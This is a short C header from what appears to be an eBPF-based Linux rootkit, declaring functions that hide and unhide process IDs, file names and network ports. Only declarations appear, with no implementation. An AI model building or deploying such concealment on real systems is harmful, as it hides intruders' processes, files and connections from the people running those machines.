#ifndef __HIDER_H
#define __HIDER_H

#include <bpf/libbpf.h>
#include "config.h"
#include "rootkit.skel.h"

/* Initialize hider system with map descriptors from skeleton */
/* Initialization */
int hider_init(struct rootkit *skel);

/* Hide API */
int hider_hide_pid(pid_t pid);
int hider_hide_file(const char *filename);
int hider_hide_port(uint16_t port);

/* Unhide API */
int hider_unhide_pid(pid_t pid);
int hider_unhide_file(const char *filename);
int hider_unhide_port(uint16_t port);

int hider_set_initial_hide_state();

#endif /* __HIDER_H */
